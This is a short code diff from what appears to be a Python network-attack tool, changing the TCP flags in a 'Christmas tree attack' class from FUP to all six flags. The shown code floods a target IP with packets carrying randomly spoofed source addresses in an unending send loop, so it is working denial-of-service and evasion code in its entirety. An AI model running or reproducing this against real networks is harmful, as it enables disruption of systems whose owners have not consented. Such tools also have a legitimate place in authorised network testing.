@@ -17,7 +17,7 @@ class ChristmasTreeAttack:
     def christmas_tree_attack(self, count):
         while self.sending:
             L3 = IP(src=random_ip.random_ip(), dst=self.dst_ip)
-            L4 = TCP(flags='FUP', sport=RandShort())
+            L4 = TCP(flags='SAFRUP', sport=RandShort())
             L5 = Raw(load=self.data)
             pkt = L3 / L4 / L5
             send(pkt)
